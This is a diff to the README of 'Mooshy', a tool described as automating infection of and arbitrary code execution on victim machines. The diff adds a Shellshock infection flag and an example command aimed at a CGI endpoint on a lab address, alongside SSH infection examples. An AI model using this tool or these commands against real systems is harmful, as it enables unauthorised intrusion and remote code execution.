@@ -30,6 +30,8 @@ Mooshy is a tool that automates the infection and execution of arbitrary code on
         	The lucky guy
       -moosh string
         	Path to moosh (default "./bin/moosh")
+      -shellShock
+            Use Shellshock for the infection
       -ssh
         	Use SSH for the infection
       -sshAgent string
@@ -55,6 +57,7 @@ The tool operates in 2 modes - infection and execution.
 ```sh
    mooshy -ssh -useSSHAgent -sshUser averagejoe -addr 192.168.56.102 # Specific SSH host
    mooshy -ssh -useSSHAgent -useSSHKnown -sshKnown known_hosts -sshUser averagejoe # SSH known_hosts
+   mooshy -shellShock http://192.168.56.102/cgi-bin/index.cgi # Infect via Shellshock
 ```
 - Connects to the victim machine(s) using either of:
     - SSH:
